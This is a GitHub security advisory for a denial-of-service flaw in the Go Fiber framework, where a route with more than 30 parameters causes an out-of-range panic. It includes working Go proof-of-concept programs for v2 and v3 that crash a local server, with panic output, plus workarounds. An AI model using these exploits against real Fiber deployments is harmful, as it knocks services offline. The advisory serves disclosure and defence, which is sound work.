# [M] Fiber has a Denial of Service Vulnerability via Route Parameter Overflow

## Summary
Severity: Medium
Advisory: GHSA-mrq8-rjmw-wpq3
CVE: CVE-2026-25882
CWE: CWE-129
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P (CVSS_V4)
Published: 2026-02-24
Source: https://github.com/advisories/GHSA-mrq8-rjmw-wpq3
Type: github-advisory

## Affected
- Go: `github.com/gofiber/fiber/v2` — affected >=0 <2.52.12
- Go: `github.com/gofiber/fiber/v3` — affected >=0 <3.1.0

## Details
A denial of service vulnerability exists in Fiber v2 and v3 that allows remote attackers to crash the application by sending requests to routes with more than 30 parameters. The vulnerability results from missing validation during route registration combined with an unbounded array write during request matching.

## Affected Versions

- **Fiber v3.0.0-rc.3** and earlier v3 releases
- **Fiber v2.52.10** and potentially all v2 releases (confirmed exploitable)
- Both versions share the same vulnerable routing implementation

## Vulnerability Details

### Root Cause

Both Fiber v2 and v3 define a fixed-size parameter array in `ctx.go`:

```go
const maxParams = 30

type DefaultCtx struct {
    values [maxParams]string  // Fixed 30-element array
    // ...
}
```

The `router.go` `register()` function accepts routes without validating parameter count. When a request matches a route exceeding 30 parameters, the code in `path.go` performs an unbounded write:

- **v3**: `path.go:514`
- **v2**: `path.go:516`

```go
// path.go:514 - NO BOUNDS CHECKING
params[paramsIterator] = path[:i]
```

When `paramsIterator >= 30`, this triggers:
```
panic: runtime error: index out of range [30] with length 30
```

### Attack Scenario

1. Application registers route with >30 parameters (e.g., via code or dynamic routing):
   ```go
   app.Get("/api/:p1/:p2/:p3/.../p35", handler)
   ```

2. Attacker sends matching HTTP request:
   ```bash
   curl http://target/api/v1/v2/v3/.../v35
   ```

3. Server crashes during request processing with runtime panic

## Proof of Concept

### For Fiber v3

```go
package main

import (
	"fmt"
	"net/http"
	"time"
	"github.com/gofiber/fiber/v3"
)

func main() {
	app := fiber.New()
	
	// Register route with 35 parameters (exceeds maxParams=30)
	path := "/test"
	for i := 1; i <= 35; i++ {
		path += fmt.Sprintf("/:p%d", i)
	}
	
	fmt.Printf("Registering route: %s...\n", path[:50]+"...")
	app.Get(path, func(c fiber.Ctx) error {
		return c.SendString("Never reached")
	})
	fmt.Println("✓ Registration succeeded (NO PANIC)")
	
	go func() {
		app.Listen(":9999")
	}()
	time.Sleep(200 * time.Millisecond)
	
	// Build exploit URL with 35 parameter values
	url := "http://localhost:9999/test"
	for i := 1; i <= 35; i++ {
		url += fmt.Sprintf("/v%d", i)
	}
	
	fmt.Println("\n🔴 Sending exploit request...")
	fmt.Println("Expected: panic at path.go:514 params[paramsIterator] = path[:i]\n")
	
	resp, err := http.Get(url)
	if err != nil {
		fmt.Printf("✗ Request failed: %v\n", err)
		fmt.Println("💥 Server crashed!")
	} else {
		fmt.Printf("Response: %d\n", resp.StatusCode)
		resp.Body.Close()
	}
}
```

**Output:**
```
Registering route: /test/:p1/:p2/:p3/:p4/:p5/:p6/:p7/:p8/:p9/:p10...
✓ Registration succeeded (NO PANIC)

🔴 Sending exploit request...
Expected: panic at path.go:514 params[paramsIterator] = path[:i]

panic: runtime error: index out of range [30] with length 30

goroutine 40 [running]:
github.com/gofiber/fiber/v3.(*routeParser).getMatch(...)
	/path/to/fiber/path.go:514
github.com/gofiber/fiber/v3.(*Route).match(...)
	/path/to/fiber/router.go:89
github.com/gofiber/fiber/v3.(*App).next(...)
	/path/to/fiber/router.go:142
```

### For Fiber v2

```go
package main

import (
	"fmt"
	"net/http"
	"time"
	"github.com/gofiber/fiber/v2"
)

func main() {
	app := fiber.New()
	
	// Register route with 35 parameters (exceeds maxParams=30)
	path := "/test"
	for i := 1; i <= 35; i++ {
		path += fmt.Sprintf("/:p%d", i)
	}
	
	fmt.Printf("Registering route: %s...\n", path[:50]+"...")
	app.Get(path, func(c *fiber.Ctx) error {
		return c.SendString("Never reached")
	})
	fmt.Println("✓ Registration succeeded (NO PANIC)")
	
	go func() {
		app.Listen(":9998")
	}()
	time.Sleep(200 * time.Millisecond)
	
	// Build exploit URL with 35 parameter values
	url := "http://localhost:9998/test"
	for i := 1; i <= 35; i++ {
		url += fmt.Sprintf("/v%d", i)
	}
	
	fmt.Println("\n🔴 Sending exploit request...")
	fmt.Println("Expected: panic at path.go:516 params[paramsIterator] = path[:i]\n")
	
	resp, err := http.Get(url)
	if err != nil {
		fmt.Printf("✗ Request failed: %v\n", err)
		fmt.Println("💥 Server crashed!")
	} else {
		fmt.Printf("Response: %d\n", resp.StatusCode)
		resp.Body.Close()
	}
}
```

**Output (v2):**
```
Registering route: /test/:p1/:p2/:p3/:p4/:p5/:p6/:p7/:p8/:p9/:p10...
✓ Registration succeeded (NO PANIC)

🔴 Sending exploit request...
Expected: panic at path.go:516 params[paramsIterator] = path[:i]

panic: runtime error: index out of range [30] with length 30

goroutine 40 [running]:
github.com/gofiber/fiber/v2.(*routeParser).getMatch(...)
	/path/to/fiber/v2@v2.52.10/path.go:512
github.com/gofiber/fiber/v2.(*Route).match(...)
	/path/to/fiber/v2@v2.52.10/router.go:84
github.com/gofiber/fiber/v2.(*App).next(...)
	/path/to/fiber/v2@v2.52.10/router.go:127
```

## Impact

### Exploitation Requirements
- No authentication required
- Single HTTP request triggers crash
- Trivially scriptable for sustained DoS
- Works against any route with >30 parameters

### Real-World Impact
- **Public APIs**: Remote DoS attacks on vulnerable endpoints
- **Microservices**: Cascade failures if vulnerable service is critical
- **Auto-scaling**: Repeated crashes prevent proper recovery
- **Monitoring**: Log flooding and alert fatigue

### Likelihood
**HIGH** - Exploitation requires only:
- Knowledge of route structure (often public in APIs)
- Standard HTTP client (curl, browser, etc.)
- Single malformed request

## Workarounds

Until patched, users should:

1. **Audit Routes**: Ensure all routes have ≤30 parameters
   ```bash
   # Search for potential issues
   grep -r "/:.*/:.*/:.*" . | grep -v node_modules
   ```

2. **Disable Dynamic Routing**: If programmatically registering routes, validate parameter count:
   ```go
   paramCount := strings.Count(route, ":")
   if paramCount > 30 {
       log.Fatal("Route exceeds maxParams")
   }
   ```

3. **Rate Limiting**: Deploy aggressive rate limiting to mitigate DoS impact

4. **Monitoring**: Alert on panic patterns in application logs

## Timeline

- **2024-12-24**: Vulnerability discovered in v3 during PR #3962 review
- **2024-12-25**: Proof of concept confirmed exploitability in v3
- **2024-12-25**: Vulnerability confirmed to also exist in v2 (same root cause)
- **2024-12-25**: Security advisory created

## References

- **v3 Related PR**: https://github.com/gofiber/fiber/pull/3962 (UpdateParam feature with defensive checks, doesn't fix root cause)
- **Vulnerable Code Locations**:
  - v3: [path.go:514](https://github.com/gofiber/fiber/blob/main/path.go#L514)
  - v2: [path.go:516](https://github.com/gofiber/fiber/blob/v2/path.go#L516)

## Credit

**Discovered by:** @sixcolors (Fiber maintainer) and @TheAspectDev

## References
- https://github.com/gofiber/fiber/security/advisories/GHSA-mrq8-rjmw-wpq3
- https://nvd.nist.gov/vuln/detail/CVE-2026-25882
- https://github.com/gofiber/fiber/pull/3962
- https://github.com/gofiber/fiber
- https://github.com/gofiber/fiber/blob/main/path.go#L514
- https://github.com/gofiber/fiber/blob/v2/path.go#L516
- https://pkg.go.dev/vuln/GO-2026-4543
